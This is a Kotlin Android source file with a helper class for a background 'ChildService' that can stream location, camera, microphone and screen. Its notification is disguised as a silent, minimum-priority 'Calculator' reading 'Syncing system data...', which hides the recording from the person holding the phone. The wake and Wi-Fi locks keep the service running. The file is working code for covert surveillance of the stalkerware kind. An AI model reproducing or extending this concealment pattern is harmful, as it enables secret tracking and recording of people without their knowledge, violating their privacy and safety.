package com.example.authapp.service

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.pm.ServiceInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.example.authapp.R
import com.example.authapp.utils.AdaptiveHeartbeatManager
import com.example.authapp.utils.hasPermission
import com.google.firebase.crashlytics.FirebaseCrashlytics

class ChildServiceNotificationHelper(private val service: Service) {

    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    private var adaptiveHeartbeatManager: AdaptiveHeartbeatManager? = null

    companion object {
        const val CHANNEL_ID = "ChildStreamChannel"
        const val NOTIFICATION_ID = 1001
    }

    fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Calculator Framework",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background system sync service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = service.getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    fun buildNotification(contentText: String): Notification {
        val discreetText = "Syncing system data..."
        return NotificationCompat.Builder(service, CHANNEL_ID)
            .setContentTitle("Calculator")
            .setContentText(discreetText)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    fun hasLocationPermission(): Boolean = service.hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
    fun hasMicrophonePermission(): Boolean = service.hasPermission(Manifest.permission.RECORD_AUDIO)
    fun hasCameraPermission(): Boolean = service.hasPermission(Manifest.permission.CAMERA)

    fun getIdleServiceType(): Int {
        var type = 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && hasLocationPermission()) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }
        return type
    }

    fun getSnapshotServiceType(): Int {
        var type = getIdleServiceType()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && hasCameraPermission()) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        return type
    }

    fun getStreamingServiceType(streamType: String): Int {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return 0
        val isScreen = streamType.equals("screen", ignoreCase = true) || streamType.equals("screen_mirror", ignoreCase = true)
        val isVideo = streamType.equals("video", ignoreCase = true) || streamType.equals("camera_video", ignoreCase = true)
        var type = 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        }
        if (hasLocationPermission()) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        if (isScreen) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (hasMicrophonePermission()) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            if (hasCameraPermission() && isVideo) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        return type
    }

    fun updateForegroundNotification(title: String, serviceType: Int) {
        try {
            ServiceCompat.startForeground(
                service,
                NOTIFICATION_ID,
                buildNotification(title),
                serviceType
            )
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] startForeground ($title) notice: ${e.localizedMessage}")
        }
    }

    fun acquireWakeLock() {
        try {
            val pm = service.getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChildService:WakeLock")?.apply {
                acquire(2 * 60 * 60 * 1000L)
            }
            val wm = service.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            wifiLock = wm?.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "ChildService:WifiLock")?.apply {
                acquire()
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] WakeLock acquire error: ${e.localizedMessage}")
        }
    }

    fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
            if (wifiLock?.isHeld == true) wifiLock?.release()
        } catch (_: Exception) {}
        wakeLock = null
        wifiLock = null
    }

    fun startHeartbeatTimer(isStreamingSupplier: () -> Boolean, currentServiceStateSupplier: () -> String) {
        adaptiveHeartbeatManager = AdaptiveHeartbeatManager(service) {
            if (isStreamingSupplier()) currentServiceStateSupplier() else "IDLE_PROTECTED"
        }.apply {
            start()
        }
    }

    fun stopHeartbeatTimer() {
        adaptiveHeartbeatManager?.stop()
        adaptiveHeartbeatManager = null
    }
}
